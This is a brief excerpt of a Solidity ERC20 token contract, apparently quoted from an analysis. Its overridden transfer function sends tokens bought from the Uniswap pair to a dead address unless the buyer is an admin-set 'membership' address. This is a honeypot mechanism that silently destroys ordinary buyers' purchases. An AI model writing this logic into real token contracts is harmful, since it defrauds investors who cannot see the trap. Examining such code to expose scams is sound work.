...
contract Yzz is ERC20{
    ...
    modifier onlyAdmin() {
        require(msg.sender == admin,"ERC20:Invalid admin`s address");
        _;
    }
    ...
    function setMembership(address _membership) external onlyAdmin(){
        membership = _membership;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override{
        if (from == uniswapV2Pair && to != membership) super._transfer(from,dead,amount);
